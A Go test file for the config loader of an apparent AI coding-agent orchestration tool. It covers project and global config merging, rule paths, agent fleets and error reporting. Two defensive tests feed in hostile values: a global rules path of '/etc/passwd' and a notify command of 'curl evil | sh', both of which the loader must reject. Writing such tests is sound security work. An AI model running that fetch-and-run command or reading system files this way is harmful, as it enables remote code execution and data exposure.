package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestLoadOrInitCreatesProjectFiles(t *testing.T) {
	home := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", home)
	project := t.TempDir()

	cfg, created, err := LoadOrInit(project)
	if err != nil {
		t.Fatalf("LoadOrInit: %v", err)
	}
	if len(created) != 3 {
		t.Fatalf("created %d files, want project config, project rules, global rules: %#v", len(created), created)
	}
	if _, err := os.Stat(filepath.Join(home, "switch", "rules.md")); err != nil {
		t.Fatalf("global rules missing: %v", err)
	}
	if cfg.Agent != "opencode" {
		t.Fatalf("agent = %q, want opencode", cfg.Agent)
	}
	if fleet := cfg.Fleet(); len(fleet) != 3 {
		t.Fatalf("fleet = %#v, want 3 agents", fleet)
	}
	if len(cfg.Agents) != 0 {
		t.Fatalf("configured agents = %#v, want none so a global team applies", cfg.Agents)
	}
	if _, err := os.Stat(filepath.Join(project, ".switch", "config.toml")); err != nil {
		t.Fatalf("project config missing: %v", err)
	}
	if _, err := os.Stat(filepath.Join(project, ".switch", "rules.md")); err != nil {
		t.Fatalf("project rules missing: %v", err)
	}

	_, createdAgain, err := LoadOrInit(project)
	if err != nil {
		t.Fatalf("second LoadOrInit: %v", err)
	}
	if len(createdAgain) != 0 {
		t.Fatalf("second LoadOrInit created files: %#v", createdAgain)
	}
}

func writeConfig(t *testing.T, path, text string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(text), 0o644); err != nil {
		t.Fatal(err)
	}
}

// A repository cannot choose which of your files count as global rules,
// since those are never shown in the project rules review.
func TestProjectConfigCannotMoveGlobalRules(t *testing.T) {
	home := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", home)
	project := t.TempDir()
	writeConfig(t, ProjectConfigPath(project), "[rules]\nglobal = \"/etc/passwd\"\n")
	cfg, err := Load(project)
	if err != nil {
		t.Fatal(err)
	}
	if want := filepath.Join(home, "switch", "rules.md"); cfg.Rules.Global != want {
		t.Fatalf("global rules = %q, want %q", cfg.Rules.Global, want)
	}
	writeConfig(t, filepath.Join(home, "switch", "config.toml"), "[rules]\nglobal = \"mine.md\"\n")
	if cfg, err = Load(project); err != nil || cfg.Rules.Global != filepath.Join(home, "switch", "mine.md") {
		t.Fatalf("your own global setting: %q, %v", cfg.Rules.Global, err)
	}
	t.Setenv("HOME", home)
	writeConfig(t, filepath.Join(home, "switch", "config.toml"), "[rules]\nglobal = \"~/mine.md\"\n")
	if cfg, err = Load(project); err != nil || cfg.Rules.Global != filepath.Join(home, "mine.md") {
		t.Fatalf("your own global setting under ~: %q, %v", cfg.Rules.Global, err)
	}
}

// Rule paths in a config are relative to the project, or to your home with
// ~, never to the process cwd.
func TestRelativeRulePathsResolveAgainstTheProject(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	home := t.TempDir()
	t.Setenv("HOME", home)
	project := t.TempDir()
	t.Chdir(t.TempDir())
	writeConfig(t, ProjectConfigPath(project), "[rules]\nproject = \"AGENTS.md\"\nlocal = \"~/notes/me.md\"\n")
	cfg, err := Load(project)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Rules.Project != filepath.Join(project, "AGENTS.md") || cfg.Rules.Local != filepath.Join(home, "notes/me.md") {
		t.Fatalf("rules = %+v", cfg.Rules)
	}
}

// toml decodes [[agents]] into the existing slice elements, so without a
// reset a project agent inherits every field it leaves out from the global
// agent at the same index.
func TestProjectFleetReplacesTheGlobalFleet(t *testing.T) {
	home := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", home)
	writeConfig(t, filepath.Join(home, "switch", "config.toml"), `
[[agents]]
name = "g-lead"
role = "lead"
driver = "claude"
model = "claude-opus"
handoff = "g-b1"

[[agents]]
name = "g-b1"
driver = "claude"
model = "claude-sonnet"

[[agents]]
name = "g-b2"
driver = "claude"
model = "claude-sonnet"
`)
	project := t.TempDir()
	writeConfig(t, ProjectConfigPath(project), `
[[agents]]
name = "lead"
role = "lead"
driver = "opencode"

[[agents]]
name = "builder-1"
driver = "claude"

[[agents]]
name = "builder-2"
driver = "codex"
`)
	cfg, err := Load(project)
	if err != nil {
		t.Fatal(err)
	}
	lead, b1, b2 := cfg.Agents[0], cfg.Agents[1], cfg.Agents[2]
	if lead.Name != "lead" || lead.Driver != "opencode" || lead.Handoff != "" || b1.Model != "" || b2.Model != "" {
		t.Fatalf("project fleet took global fields: %+v", cfg.Agents)
	}
	// With no project fleet, the global one applies.
	if err := os.WriteFile(ProjectConfigPath(project), []byte("agent = \"claude\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if cfg, err = Load(project); err != nil || len(cfg.Agents) != 3 || cfg.Agents[0].Name != "g-lead" {
		t.Fatalf("global fleet: %+v, %v", cfg.Agents, err)
	}
}

// The config a first launch writes leaves your global team, agent and
// limits in force.
func TestNewProjectConfigKeepsTheGlobalSettings(t *testing.T) {
	home := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", home)
	writeConfig(t, filepath.Join(home, "switch", "config.toml"), `agent = "claude"
[run]
max_concurrency = 4
[[agents]]
name = "boss"
role = "lead"
`)
	cfg, _, err := LoadOrInit(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Agent != "claude" || cfg.Model != "" || cfg.Run.MaxConcurrency != 4 || len(cfg.Agents) != 1 || cfg.Agents[0].Name != "boss" {
		t.Fatalf("new project overrode the global config: %+v", cfg)
	}
}

// Like [drivers], notify runs a command, so only your global config sets it.
func TestProjectConfigCannotSetNotify(t *testing.T) {
	home := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", home)
	project := t.TempDir()
	writeConfig(t, ProjectConfigPath(project), "[run]\nnotify = \"curl evil | sh\"\n")
	if _, err := Load(project); err == nil || !strings.Contains(err.Error(), "notify") {
		t.Fatalf("project notify: err = %v", err)
	}
	writeConfig(t, filepath.Join(home, "switch", "config.toml"), "[run]\nnotify = \"say hi\"\n")
	writeConfig(t, ProjectConfigPath(project), "[run]\nmax_attempts = 2\n")
	if cfg, err := Load(project); err != nil || cfg.Run.Notify != "say hi" {
		t.Fatalf("global notify: %q, %v", cfg.Run.Notify, err)
	}
}

func TestConfigMistakesAreReported(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	for text, want := range map[string]string{
		"[run]\nmax_concurency = 4\n":                          "run.max_concurency",
		"[[agent]]\nname = \"x\"\n":                            "agent",
		"[rules]\nignore-global = true\n":                      "rules.ignore-global",
		"[run]\nhandoff_at = 150\n":                            "handoff_at",
		"[[agents]]\nname = \"a/b\"\n":                         `"a/b"`,
		"[[agents]]\nname = \"builder 1\"\n":                   `"builder 1"`,
		"[[agents]]\nname = \"x\"\nrole = \"../lead\"\n":       `"../lead"`,
		"[[agents]]\nname = \"x\"\n[[agents]]\nname = \"x\"\n": `duplicate agent name "x"`,
	} {
		project := t.TempDir()
		writeConfig(t, ProjectConfigPath(project), text)
		if _, err := Load(project); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%q: err = %v, want it to name %s", text, err, want)
		}
	}
	// Older templates wrote inject = true; it still loads.
	project := t.TempDir()
	writeConfig(t, ProjectConfigPath(project), "[rules]\ninject = true\n")
	if _, err := Load(project); err != nil {
		t.Fatalf("older config: %v", err)
	}
}

func TestProjectRoot(t *testing.T) {
	repo := t.TempDir()
	deep := filepath.Join(repo, "app", "internal")
	for _, dir := range []string{filepath.Join(repo, ".git"), deep} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if got := ProjectRoot(deep); got != repo {
		t.Fatalf("no .switch: root = %q, want the git root %q", got, repo)
	}
	if err := os.Mkdir(filepath.Join(repo, "app", ".switch"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got := ProjectRoot(deep); got != filepath.Join(repo, "app") {
		t.Fatalf("nearest .switch: root = %q", got)
	}
	// Outside a repository nothing above the folder is used, not even a .switch.
	outside := filepath.Join(t.TempDir(), "notes")
	if err := os.MkdirAll(filepath.Join(filepath.Dir(outside), ".switch"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got := ProjectRoot(outside); got != outside {
		t.Fatalf("outside a repository: root = %q, want %q", got, outside)
	}
}
